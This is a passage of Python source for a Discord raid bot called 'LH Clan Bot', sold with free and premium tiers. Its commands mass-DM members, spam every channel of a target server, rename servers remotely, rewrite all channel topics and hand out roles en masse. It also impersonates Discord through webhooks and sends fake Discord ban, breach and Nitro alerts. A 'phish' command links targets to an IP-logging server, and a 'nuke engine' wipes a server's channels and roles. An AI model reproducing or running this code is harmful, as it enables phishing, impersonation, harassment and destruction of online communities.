            try: await status_msg.edit(content=f"📬 Mass DMing... {success+failed}/{guild.member_count}")
            except Exception: pass
    embed = discord.Embed(title="📬 Mass DM Complete", color=0x00ff00)
    embed.add_field(name="Server",    value=guild.name,   inline=False)
    embed.add_field(name="✅ Sent",   value=str(success), inline=True)
    embed.add_field(name="❌ Failed", value=str(failed),  inline=True)
    try: await status_msg.delete()
    except Exception: pass
    try: await ctx.author.send(embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=15)


@bot.command(name="announce")
async def announce(ctx, token_str: str = None, server_id: str = None, *, message: str = None):
    """post a message in EVERY channel of a target server simultaneously"""
    if not token_str or not server_id or not message:
        await ctx.send("❌ Usage: `!announce <token> <serverID> <message>`", delete_after=5)
        return
    valid, reason = _peek_token(token_str)
    if not valid:
        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    validate_token(token_str)
    try: await ctx.message.delete()
    except Exception: pass

    async def send_to_channel(ch):
        try: await ch.send(message)
        except Exception: pass

    await asyncio.gather(*[send_to_channel(ch) for ch in guild.text_channels], return_exceptions=True)

    embed = discord.Embed(title="📢 Announce Complete", color=0x00ff00, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server",   value=guild.name,                        inline=False)
    embed.add_field(name="Channels", value=str(len(guild.text_channels)),     inline=True)
    embed.add_field(name="Message",  value=message[:100] + "..." if len(message) > 100 else message, inline=False)
    try: await ctx.author.send(embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=10)


@bot.command(name="rename")
async def rename_server(ctx, token_str: str = None, server_id: str = None, *, new_name: str = None):
    """rename a target server remotely"""
    if not token_str or not server_id or not new_name:
        await ctx.send("❌ Usage: `!rename <token> <serverID> <new name>`", delete_after=5)
        return
    valid, reason = _peek_token(token_str)
    if not valid:
        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    validate_token(token_str)
    try: await ctx.message.delete()
    except Exception: pass
    old_name = guild.name
    try:
        await guild.edit(name=new_name, reason="LH Remote Rename")
        embed = discord.Embed(title="✅ Server Renamed", color=0x00ff00, timestamp=discord.utils.utcnow())
        embed.add_field(name="Old Name", value=old_name,  inline=True)
        embed.add_field(name="New Name", value=new_name,  inline=True)
        embed.add_field(name="Server ID", value=str(guild.id), inline=False)
        try: await ctx.author.send(embed=embed)
        except Exception: await ctx.send(embed=embed, delete_after=10)
    except discord.Forbidden:
        await ctx.send("❌ Bot needs Manage Server permission in that server.", delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Failed: `{e}`", delete_after=5)


@bot.command(name="fake")
@commands.has_permissions(administrator=True)
async def fake_system(ctx, *, message: str = None):
    """post as Discord system via webhook"""
    if not message:
        await ctx.send("❌ Usage: `!fake <message>`", delete_after=5); return
    try: await ctx.message.delete()
    except Exception: pass
    try: webhook = await ctx.channel.create_webhook(name="Discord")
    except discord.Forbidden:
        await ctx.send("❌ Bot needs Manage Webhooks.", delete_after=5); return
    try:
        await webhook.send(content=message, username="Discord", avatar_url="https://cdn.discordapp.com/embed/avatars/0.png")
    except Exception as e:
        await ctx.send(f"❌ Send failed: `{e}`", delete_after=5)
    finally:
        await webhook.delete()


@bot.command(name="fakealert")
async def fake_alert(ctx, token_str: str = None, user_id: str = None, *, alert_type: str = "nitro"):
    """
    send a convincing fake alert DM to any user.
    alert_type options: nitro, ban, warning, verify, breach
    """
    if not token_str or not user_id:
        await ctx.send("❌ Usage: `!fakealert <token> <userID> [nitro|ban|warning|verify|breach]`", delete_after=5)
        return
    valid, reason = _peek_token(token_str)
    if not valid:
        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: await ctx.message.delete()
    except Exception: pass
    try: target = await bot.fetch_user(int(user_id))
    except (discord.NotFound, ValueError):
        await ctx.send("❌ User not found.", delete_after=5); return

    validate_token(token_str)

    templates = {
        "nitro": {
            "title": "🎁 You've received Discord Nitro!",
            "description": (
                "A friend has gifted you **1 Month of Discord Nitro**!\n\n"
                "To claim your gift, verify your account using the link below.\n"
                "**This offer expires in 24 hours.**\n\n"
                "[Claim Your Nitro Gift](https://discord.com/billing/premium)"
            ),
            "color": 0x5865f2,
            "footer": "Discord Nitro | discord.com"
        },
        "ban": {
            "title": "⚠️ Account Action Required",
            "description": (
                "Your account has been flagged for **violating Discord's Terms of Service**.\n\n"
                "You have **24 hours** to appeal before your account is permanently suspended.\n\n"
                "[Appeal Here](https://support.discord.com/hc/requests/new)"
            ),
            "color": 0xff0000,
            "footer": "Discord Trust & Safety | support.discord.com"
        },
        "warning": {
            "title": "🚨 Official Warning — Action Required",
            "description": (
                "This is an official warning from the **Discord Safety Team**.\n\n"
                "Suspicious activity has been detected on your account.\n"
                "Please verify your identity within **12 hours** to avoid suspension.\n\n"
                "[Verify Account](https://discord.com/safety)"
            ),
            "color": 0xff9900,
            "footer": "Discord Safety Team | discord.com/safety"
        },
        "verify": {
            "title": "🔐 Verification Required",
            "description": (
                "Discord has detected a new login to your account from an **unrecognized location**.\n\n"
                "If this was you, no action is needed.\n"
                "If this **wasn't you**, secure your account immediately:\n\n"
                "[Secure My Account](https://discord.com/settings/security-and-privacy)"
            ),
            "color": 0x00aaff,
            "footer": "Discord Security | discord.com"
        },
        "breach": {
            "title": "🛑 Security Breach Detected",
            "description": (
                "Your Discord account credentials may have been **compromised** in a data breach.\n\n"
                "We strongly recommend changing your password immediately and enabling **2FA**.\n\n"
                "[Change Password Now](https://discord.com/settings/security-and-privacy)"
            ),
            "color": 0xff0000,
            "footer": "Discord Security | discord.com"
        },
    }

    tpl = templates.get(alert_type.lower(), templates["nitro"])
    embed = discord.Embed(
        title=tpl["title"],
        description=tpl["description"],
        color=tpl["color"],
        timestamp=discord.utils.utcnow()
    )
    embed.set_footer(text=tpl["footer"])
    embed.set_thumbnail(url="https://cdn.discordapp.com/embed/avatars/0.png")

    try:
        await target.send(embed=embed)
        confirm = discord.Embed(title="✅ Fake Alert Sent", color=0x00ff00, timestamp=discord.utils.utcnow())
        confirm.add_field(name="Target",     value=f"{target} (`{target.id}`)", inline=False)
        confirm.add_field(name="Alert Type", value=alert_type.lower(),          inline=True)
        try: await ctx.author.send(embed=confirm)
        except Exception: await ctx.send(embed=confirm, delete_after=10)
    except discord.Forbidden:
        await ctx.send("❌ Target has DMs disabled.", delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Failed: `{e}`", delete_after=5)


@bot.command(name="poison")
async def poison_topics(ctx, token_str: str = None, server_id: str = None, *, topic: str = None):
    """change the topic of every channel in a target server"""
    if not token_str or not server_id or not topic:
        await ctx.send("❌ Usage: `!poison <token> <serverID> <new topic>`", delete_after=5)
        return
    valid, reason = _peek_token(token_str)
    if not valid:
        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    validate_token(token_str)
    try: await ctx.message.delete()
    except Exception: pass

    success = 0; failed = 0
    for ch in guild.text_channels:
        try:
            await ch.edit(topic=topic[:1024], reason="LH Poison")
            success += 1
        except Exception:
            failed += 1

    embed = discord.Embed(title="☠️ Channel Topics Poisoned", color=0xff4400, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server",     value=guild.name,   inline=False)
    embed.add_field(name="✅ Changed", value=str(success), inline=True)
    embed.add_field(name="❌ Failed",  value=str(failed),  inline=True)
    embed.add_field(name="New Topic",  value=topic[:100],  inline=False)
    try: await ctx.author.send(embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=10)


@bot.command(name="phish")
async def phish(ctx, token_str: str = None, user_id: str = None):
    """
    Sends a fake Nitro gift DM with a link that logs the target's IP when clicked.
    Requires PHISH_URL set in Railway Variables pointing to your phish_server.py deployment.
    """
    if not token_str or not user_id:
        await ctx.send("❌ Usage: `!phish <token> <userID>`", delete_after=5)
        return

    valid, reason = _peek_token(token_str)
    if not valid:
        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return

    try: await ctx.message.delete()
    except Exception: pass

    try:
        target = await bot.fetch_user(int(user_id))
    except (discord.NotFound, ValueError):
        await ctx.send("❌ User not found.", delete_after=5)
        return

    validate_token(token_str)

    PHISH_URL = os.environ.get("PHISH_URL", "https://your-phish-server.up.railway.app")
    link      = f"{PHISH_URL}/claim/{target.id}"

    embed = discord.Embed(
        title="🎁 You've received a Nitro gift!",
        description=(
            "A friend has gifted you **3 Months of Discord Nitro**!\n\n"
            "Nitro includes:\n"
            "› Animated avatars & profile banners\n"
            "› 2 server boosts\n"
            "› 500MB upload limit\n\n"
            f"**[Claim Your Gift]({link})**\n\n"
            "*This gift expires in 48 hours.*"
        ),
        color=0x5865f2,
        timestamp=discord.utils.utcnow()
    )
    embed.set_thumbnail(url="https://cdn.discordapp.com/embed/avatars/0.png")
    embed.set_footer(text="Discord Nitro | discord.com/billing/premium")

    try:
        await target.send(embed=embed)
        confirm = discord.Embed(title="✅ Phish Sent", color=0x00ff00, timestamp=discord.utils.utcnow())
        confirm.add_field(name="Target",  value=f"{target} (`{target.id}`)", inline=False)
        confirm.add_field(name="Link",    value=f"`{link}`",                 inline=False)
        confirm.add_field(name="Log URL", value=f"`{PHISH_URL}/logs`",       inline=False)
        try: await ctx.author.send(embed=confirm)
        except Exception: await ctx.send(embed=confirm, delete_after=10)
    except discord.Forbidden:
        await ctx.send("❌ Target has DMs disabled.", delete_after=5)
    except Exception as e:
        await ctx.send(f"❌ Failed: `{e}`", delete_after=5)


@bot.command(name="massrole")
async def mass_role(ctx, token_str: str = None, server_id: str = None, role_id: str = None):
    """assign a specific role to every member of a target server"""
    if not token_str or not server_id or not role_id:
        await ctx.send("❌ Usage: `!massrole <token> <serverID> <roleID>`", delete_after=5)
        return
    valid, reason = _peek_token(token_str)
    if not valid:
        await ctx.send(embed=discord.Embed(title="❌ Invalid Token", description=reason, color=0xff0000), delete_after=5)
        try: await ctx.message.delete()
        except Exception: pass
        return
    try: guild = bot.get_guild(int(server_id))
    except ValueError:
        await ctx.send("❌ Invalid server ID.", delete_after=5); return
    if not guild:
        await ctx.send("❌ Bot is not in that server.", delete_after=5); return
    role = guild.get_role(int(role_id))
    if not role:
        await ctx.send("❌ Role not found in that server.", delete_after=5); return
    validate_token(token_str)
    try: await ctx.message.delete()
    except Exception: pass

    status_msg = await ctx.send(f"🎭 Assigning **{role.name}** to all members...")
    success = 0; failed = 0
    for member in guild.members:
        if member.bot or role in member.roles: continue
        try:
            await member.add_roles(role, reason="LH MassRole")
            success += 1
        except Exception:
            failed += 1
        if (success + failed) % 10 == 0:
            try: await status_msg.edit(content=f"🎭 Assigning role... {success+failed}/{guild.member_count}")
            except Exception: pass

    embed = discord.Embed(title="🎭 Mass Role Complete", color=0x00ff00, timestamp=discord.utils.utcnow())
    embed.add_field(name="Server",    value=guild.name,  inline=False)
    embed.add_field(name="Role",      value=role.name,   inline=True)
    embed.add_field(name="✅ Given",  value=str(success), inline=True)
    embed.add_field(name="❌ Failed", value=str(failed),  inline=True)
    try: await status_msg.delete()
    except Exception: pass
    try: await ctx.author.send(embed=embed)
    except Exception: await ctx.send(embed=embed, delete_after=15)


# ══════════════════════════════════════════════════════════════
#  ANTINUKE COMMANDS
# ══════════════════════════════════════════════════════════════

@bot.command(name="antinuke")
async def antinuke_cmd(ctx, action: str = None, *, args: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    guild = ctx.guild

    if not action:
        await ctx.send("❌ Usage: `!antinuke <on|off|status|whitelist|setup|snapshot|suspicious>`", delete_after=5)
        return

    action = action.lower()

    if action == "on":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5); return
        antinuke_enabled[guild.id] = True
        snapshot_roles(guild); snapshot_channels(guild)
        embed = discord.Embed(title="🛡️ AntiNuke Enabled", color=0x00ff00, timestamp=discord.utils.utcnow())
        embed.description = (
            f"**{guild.name}** is now protected.\n\n"
            "• Mass channel deletes/creates → auto-ban + restore\n"
            "• Mass role deletes → auto-ban + restore\n"
            "• Permission escalation → auto-ban\n"
            "• Mass kicks & bans → auto-ban\n"
            "• Unauthorized webhook creates → auto-ban\n"
            "• Unauthorized bot joins → auto-kick\n"
            "• Audit watcher: alerts at 2+ suspicious actions\n\n"
            f"Logs → `#{LOG_CHANNEL_NAME}`"
        )
        embed.set_footer(text="Only premium user can disable AntiNuke")
        try:
            await ctx.author.send(embed=embed)
            await ctx.send("🛡️ AntiNuke enabled + snapshots taken.", delete_after=5)
        except discord.Forbidden:
            msg = await ctx.send(embed=embed)
            await asyncio.sleep(15)
            try: await msg.delete()
            except Exception: pass
        return

    if action == "off":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send(embed=discord.Embed(title="❌ Access Denied", description="Only the **premium user** can disable AntiNuke.", color=0xff0000), delete_after=5)
            return
        antinuke_enabled[guild.id] = False
        try:
            await ctx.author.send(embed=discord.Embed(title="⚠️ AntiNuke Disabled", description=f"Protection disabled for **{guild.name}**.", color=0xff9900, timestamp=discord.utils.utcnow()))
            await ctx.send("⚠️ AntiNuke disabled.", delete_after=5)
        except discord.Forbidden:
            msg = await ctx.send(embed=discord.Embed(title="⚠️ AntiNuke Disabled", color=0xff9900))
            await asyncio.sleep(10)
            try: await msg.delete()
            except Exception: pass
        return

    if action == "status":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5); return
        status = "🟢 ENABLED" if antinuke_enabled[guild.id] else "🔴 DISABLED"
        wl     = antinuke_whitelist[guild.id]
        wl_str = "\n".join([f"<@{uid}> (`{uid}`)" for uid in wl]) or "None"
        embed  = discord.Embed(title="🛡️ AntiNuke Status", color=0x00ff00 if antinuke_enabled[guild.id] else 0xff0000, timestamp=discord.utils.utcnow())
        embed.add_field(name="Status",   value=f"**{status}**",          inline=False)
        embed.add_field(name="Server",   value=guild.name,               inline=True)
        embed.add_field(name="Members",  value=str(guild.member_count),  inline=True)
        embed.add_field(name="Snapshots", value=f"Roles: **{len(role_snapshots.get(guild.id, {}))}** | Channels: **{len(channel_snapshots.get(guild.id, {}))}**", inline=False)
        embed.add_field(name="Thresholds", value="Channel delete/create: **3/5s** | Role delete: **3/5s** | Kick: **3/5s** | Ban: **2/5s** | Webhook: **2/10s**", inline=False)
        embed.add_field(name="Whitelist", value=wl_str, inline=False)
        embed.set_footer(text="LH AntiNuke System")
        try:
            await ctx.author.send(embed=embed)
            await ctx.send("🛡️ Status sent to your DMs.", delete_after=5)
        except discord.Forbidden:
            msg = await ctx.send(embed=embed)
            await asyncio.sleep(20)
            try: await msg.delete()
            except Exception: pass
        return

    if action == "whitelist":
        if ctx.author.id != PREMIUM_USER_ID:
            await ctx.send("❌ Only premium user can manage whitelist.", delete_after=5); return
        if not args or len(args.split()) < 2:
            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5); return
        parts = args.split()
        sub = parts[0].lower()
        try: target_id = int(parts[1])
        except ValueError:
            await ctx.send("❌ Invalid user ID.", delete_after=5); return
        if sub == "add":
            antinuke_whitelist[guild.id].add(target_id)
            await ctx.send(f"✅ `{target_id}` added to whitelist.", delete_after=5)
        elif sub == "remove":
            antinuke_whitelist[guild.id].discard(target_id)
            await ctx.send(f"✅ `{target_id}` removed from whitelist.", delete_after=5)
        else:
            await ctx.send("❌ Usage: `!antinuke whitelist <add|remove> <userID>`", delete_after=5)
        return

    if action == "setup":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5); return
        ch = await get_or_create_log_channel(guild)
        if ch:
            await ctx.send(f"✅ Log channel ready: {ch.mention}", delete_after=10)
        else:
            await ctx.send("❌ Failed. Check bot permissions.", delete_after=5)
        return

    if action == "snapshot":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5); return
        snapshot_roles(guild); snapshot_channels(guild)
        await ctx.send(f"✅ Snapshots refreshed — `{len(role_snapshots[guild.id])}` roles, `{len(channel_snapshots[guild.id])}` channels.", delete_after=8)
        return

    if action == "suspicious":
        if not ctx.author.guild_permissions.administrator:
            await ctx.send("❌ Administrator required.", delete_after=5); return
        log = suspicious_log.get(guild.id, {})
        if not log:
            await ctx.send("✅ No suspicious activity recorded.", delete_after=8); return
        embed = discord.Embed(title="👁️ Suspicious Activity Log", color=0xff9900, timestamp=discord.utils.utcnow())
        embed.add_field(name="Server", value=guild.name, inline=False)
        for user_id, actions in log.items():
            if not actions: continue
            member = guild.get_member(user_id)
            name   = str(member) if member else f"ID: {user_id}"
            lines  = "\n".join([f"• {a.replace('_',' ').title()}: **{c}x**" for a, c in actions.items()])
            embed.add_field(name=name, value=lines, inline=True)
        embed.set_footer(text="LH AntiNuke — Audit Watcher")
        try:
            await ctx.author.send(embed=embed)
            await ctx.send("👁️ Log sent to your DMs.", delete_after=5)
        except discord.Forbidden:
            msg = await ctx.send(embed=embed)
            await asyncio.sleep(20)
            try: await msg.delete()
            except Exception: pass
        return

    await ctx.send("❌ Unknown action. Use: `on`, `off`, `status`, `whitelist`, `setup`, `snapshot`, `suspicious`", delete_after=5)


# ══════════════════════════════════════════════════════════════
#  HELP MENU
# ══════════════════════════════════════════════════════════════

def build_free_embed() -> discord.Embed:
    embed = discord.Embed(title="🆓 Free Commands", description="```\nPrefix: !   Slash: /\n🔒 Admin only\n```", color=0x5865f2, timestamp=discord.utils.utcnow())
    embed.add_field(name="━━━━ 💀 NUKE ━━━━",        value="`!LH` 🔒\n`!LH GHOST` 🔒",                                                                                             inline=False)
    embed.add_field(name="━━━━ 🛡️ ANTINUKE ━━━━",   value="`!antinuke on/status/setup/snapshot/suspicious` 🔒",                                                                    inline=False)
    embed.add_field(name="━━━━ 🎭 SOCIAL ━━━━",      value="`!fake <msg>` 🔒",                                                                                                      inline=False)
    embed.add_field(name="━━━━ 🔐 VERIFY ━━━━",      value="`/setupverify` 🔒",                                                                                                     inline=False)
    embed.add_field(name="━━━━ 📬 DM ━━━━",          value="`/dm <msg> <count> [member|user_id] [delay]`",                                                                          inline=False)
    embed.add_field(name="━━━━ 📊 INFO ━━━━",        value="`/serverinfo` · `/userinfo` · `/poll` · `/ping`",                                                                       inline=False)
    embed.set_footer(text="LH Clan Bot | Free Tier")
    return embed

def build_premium_embed(user_id: int) -> discord.Embed:
    has   = is_premium(user_id)
    exp   = premium_expiry_str(user_id) if has else "No Access"
    embed = discord.Embed(title="👑 Premium Commands", description="```\n🔑 Token required   ⭐ Owner only\n```", color=0xffd700 if has else 0x555555, timestamp=discord.utils.utcnow())
    embed.add_field(
        name="━━━━ 💀 NUKE ━━━━",
        value=(
            "`!LH EXEC <serverID> <token>` 🔑\n"
            "`!LH ALL <token>` 🔑\n"
            "`!LH GHOST` 🔒\n"
            "`!LH CLONE <srcID> <tgtID> <token>` 🔑\n"
            "`!LH T` ⭐\n"
            "`!LHP` 🔑"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━ 🔑 TOKEN SYSTEM ━━━━",
        value=(
            "`/token create [uses] [duration] [label]` ⭐\n"
            "`/token list` ⭐\n"
            "`/token revoke <token>` ⭐\n"
            "`/token info <token>` ⭐\n\n"
            "Duration examples: `1d`, `6h`, `30m`, `90s`\n"
            "Uses: `0` = unlimited, `5` = 5 uses"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━ 🎭 SOCIAL ENGINEERING ━━━━",
        value=(
            "`!impersonate <token> <userID> <msg>` 🔑\n"
            "`!massdm <token> <serverID> <msg>` 🔑\n"
            "`!announce <token> <serverID> <msg>` 🔑\n"
            "`!rename <token> <serverID> <name>` 🔑\n"
            "`!fakealert <token> <userID> [type]` 🔑\n"
            "   types: `nitro` `ban` `warning` `verify` `breach`\n"
            "`!poison <token> <serverID> <topic>` 🔑\n"
            "`!massrole <token> <serverID> <roleID>` 🔑\n"
            "`!phish <token> <userID>` 🔑 *(needs PHISH_URL env var)*"
        ),
        inline=False
    )
    embed.add_field(
        name="━━━━ 🛡️ ANTINUKE ━━━━",
        value="`!antinuke off` ⭐\n`!antinuke whitelist add/remove <id>` ⭐",
        inline=False
    )
    embed.add_field(
        name="━━━━ 📡 INTEL ━━━━",
        value="`!LHSPY` ⭐\n`!LHMEMBERS <serverID>` ⭐\n`!LHTOKENS <serverID>` ⭐",
        inline=False
    )
    embed.add_field(
        name="━━━━ 🎁 PREMIUM GIFTING ━━━━",
        value="`!givepremium <userID> <duration>` ⭐\n`!revokepremium <userID>` ⭐\n`!premiumlist` ⭐",
        inline=False
    )
    embed.add_field(name="━━━━ 🔑 YOUR ACCESS ━━━━", value=f"Status: **{'✅ Active' if has else '❌ None'}**\nExpires: **{exp}**", inline=False)
    embed.set_footer(text="LH Clan Bot | Premium Tier")
    return embed

class HelpView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Free Commands", emoji="🆓", style=discord.ButtonStyle.blurple, custom_id="help_free")
    async def free_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(embed=build_free_embed(), view=self)

    @discord.ui.button(label="Premium Commands", emoji="👑", style=discord.ButtonStyle.green, custom_id="help_premium")
    async def premium_commands(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(embed=build_premium_embed(interaction.user.id), view=self)

    async def on_timeout(self): pass

@bot.command(name="help")
async def help_cmd(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    msg = await ctx.send(embed=build_free_embed(), view=HelpView())
    await asyncio.sleep(120)
    try: await msg.delete()
    except Exception: pass


# ══════════════════════════════════════════════════════════════
#  PREMIUM GIFTING
# ══════════════════════════════════════════════════════════════

@bot.command(name="givepremium")
async def give_premium(ctx, user_id: str = None, duration: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send(embed=discord.Embed(title="❌ Access Denied", description="Only the master user can gift premium.", color=0xff0000), delete_after=5); return
    if not user_id or not duration:
        await ctx.send("❌ Usage: `!givepremium <userID> <duration>`\nDuration: `1d`, `7d`, `30d`, `permanent`", delete_after=10); return
    secs = parse_duration(duration)
    if secs is None:
        await ctx.send("❌ Invalid duration.", delete_after=5); return
    try:
        target_id = int(user_id)
        target    = await bot.fetch_user(target_id)
    except (ValueError, discord.NotFound):
        await ctx.send("❌ User not found.", delete_after=5); return
    premium_users[target_id] = float("inf") if secs == float("inf") else time.time() + secs
    exp_str = premium_expiry_str(target_id)
    try:
        await target.send(embed=discord.Embed(title="👑 Premium Access Granted!", description=f"You have been granted **LH Premium**.\n\n**Duration:** `{exp_str}`\n\nUse `!help` → Premium Commands.", color=0xffd700, timestamp=discord.utils.utcnow()))
    except Exception: pass
    confirm = discord.Embed(title="✅ Premium Gifted", color=0x00ff00)
    confirm.add_field(name="User",     value=f"{target} (`{target_id}`)", inline=False)
    confirm.add_field(name="Duration", value=exp_str, inline=True)
    try:
        await ctx.author.send(embed=confirm)
        await ctx.send("✅ Premium gifted.", delete_after=5)
    except Exception:
        await ctx.send(embed=confirm, delete_after=10)

@bot.command(name="revokepremium")
async def revoke_premium(ctx, user_id: str = None):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send(embed=discord.Embed(title="❌ Access Denied", color=0xff0000), delete_after=5); return
    if not user_id:
        await ctx.send("❌ Usage: `!revokepremium <userID>`", delete_after=5); return
    try: target_id = int(user_id)
    except ValueError:
        await ctx.send("❌ Invalid user ID.", delete_after=5); return
    if target_id == PREMIUM_USER_ID:
        await ctx.send("❌ Cannot revoke master user.", delete_after=5); return
    if target_id not in premium_users:
        await ctx.send("❌ That user doesn't have premium.", delete_after=5); return
    premium_users.pop(target_id)
    try:
        target = await bot.fetch_user(target_id)
        await target.send(embed=discord.Embed(title="⚠️ Premium Access Revoked", description="Your LH Premium access has been revoked.", color=0xff0000, timestamp=discord.utils.utcnow()))
    except Exception: pass
    await ctx.send(f"✅ Premium revoked for `{target_id}`.", delete_after=5)

@bot.command(name="premiumlist")
async def premium_list(ctx):
    try: await ctx.message.delete()
    except Exception: pass
    if ctx.author.id != PREMIUM_USER_ID:
        await ctx.send("❌ Access Denied.", delete_after=5); return
    embed = discord.Embed(title="👑 Premium Users", color=0xffd700, timestamp=discord.utils.utcnow())
    if not premium_users:
        embed.description = "No premium users."
    else:
        lines = []
        for uid, expiry in premium_users.items():
            exp    = "Permanent" if expiry == float("inf") else premium_expiry_str(uid)
            status = "✅" if is_premium(uid) else "❌ Expired"
            lines.append(f"`{uid}` — {exp} {status}")
        embed.description = "\n".join(lines)
    embed.set_footer(text=f"Total: {len(premium_users)} users")
    try:
        await ctx.author.send(embed=embed)
        await ctx.send("👑 Premium list sent to your DMs.", delete_after=5)
    except Exception:
        msg = await ctx.send(embed=embed)
        await asyncio.sleep(20)
        try: await msg.delete()
        except Exception: pass


# ══════════════════════════════════════════════════════════════
#  VERIFY
# ══════════════════════════════════════════════════════════════

class VerifyButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Verify", emoji="✅", style=discord.ButtonStyle.green, custom_id="verify_button")
    async def verify(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = interaction.guild
        role  = discord.utils.get(guild.roles, name=VERIFY_ROLE_NAME)
        if not role:
            await interaction.response.send_message(embed=discord.Embed(title="❌ Setup Error", description=f"No role named `{VERIFY_ROLE_NAME}`.\nContact an admin.", color=0xff0000), ephemeral=True); return
        if role in interaction.user.roles:
            await interaction.response.send_message(embed=discord.Embed(title="Already Verified", description="You already have the verified role.", color=0x5865f2), ephemeral=True); return
        try:
            await interaction.user.add_roles(role, reason="Passed verification")
            embed = discord.Embed(title="✅ Verification Successful", description=f"Welcome to **{guild.name}**, {interaction.user.mention}!\n\nYou now have full access to the server.", color=0x00ff00, timestamp=discord.utils.utcnow())
            embed.set_thumbnail(url=interaction.user.display_avatar.url)
            embed.set_footer(text=f"{guild.name} Verification System", icon_url=guild.icon.url if guild.icon else None)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            log_embed = discord.Embed(title="👤 Member Verified", color=0x00ff00, timestamp=discord.utils.utcnow())
            log_embed.add_field(name="User", value=f"{interaction.user} (`{interaction.user.id}`)", inline=False)
            log_embed.add_field(name="Role", value=role.mention, inline=True)
            log_embed.set_thumbnail(url=interaction.user.display_avatar.url)
            log_ch = await get_or_create_log_channel(guild)
            if log_ch:
                try: await log_ch.send(embed=log_embed)
                except Exception: pass
        except discord.Forbidden:
            await interaction.response.send_message(embed=discord.Embed(title="❌ Permission Error", description="Bot lacks permission to assign roles.", color=0xff0000), ephemeral=True)

@bot.tree.command(name="setupverify", description="Post the professional verification panel (admin only)")
@app_commands.checks.has_permissions(administrator=True)
async def setupverify(interaction: discord.Interaction):
    guild = interaction.guild
    embed = discord.Embed(
        title="🔐 Server Verification",
        description=(
            f"**Welcome to {guild.name}!**\n\n"
            "To gain access to the server, you must verify your account.\n\n"
            "**How to verify:**\n"
            "› Click the **Verify** button below\n"
            "› You will instantly receive access\n\n"
            "**Why verify?**\n"
            "› Keeps the server safe from bots and raiders\n"
            "› Unlocks all channels and features\n\n"
            "*By verifying, you agree to follow the server rules.*"
        ),
        color=0x5865f2, timestamp=discord.utils.utcnow()
    )
    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
    embed.set_footer(text=f"{guild.name} • Verification System", icon_url=guild.icon.url if guild.icon else None)
    await interaction.response.send_message(embed=embed, view=VerifyButton())


# ══════════════════════════════════════════════════════════════
#  CORE NUKE ENGINE
# ══════════════════════════════════════════════════════════════

async def clone_server(source: discord.Guild, target: discord.Guild):
    """copy source server structure into target — roles, categories, text + voice channels"""

    # wipe target channels
    await asyncio.gather(*[ch.delete() for ch in target.channels], return_exceptions=True)

    # wipe target roles
    for role in target.roles:
        if role.is_default() or role >= target.me.top_role:
            continue
        try:
            await role.delete(reason="LH Clone — clearing roles")
        except Exception:
            pass

    # clone roles
    role_map: dict[int, discord.Role] = {}
    for role in sorted([r for r in source.roles if not r.is_default() and not r.managed], key=lambda r: r.position):
        try:
            new_role = await target.create_role(
                name=role.name, color=role.color, permissions=role.permissions,
                hoist=role.hoist, mentionable=role.mentionable, reason="LH Clone"
            )
            role_map[role.id] = new_role
        except Exception:
            pass

    def build_overwrites(channel_or_cat, tgt_guild):
        overwrites = {}
        for obj, ow in channel_or_cat.overwrites.items():
            if isinstance(obj, discord.Role):
                new_obj = tgt_guild.default_role if obj.is_default() else role_map.get(obj.id)
            else:
                new_obj = None
            if new_obj:
                overwrites[new_obj] = ow
        return overwrites

    # clone categories
    category_map: dict[int, discord.CategoryChannel] = {}
    for cat in sorted(source.categories, key=lambda c: c.position):
        try:
            new_cat = await target.create_category(
                name=cat.name, overwrites=build_overwrites(cat, target), reason="LH Clone"
            )
            category_map[cat.id] = new_cat
        except Exception:
            pass

    # clone text channels
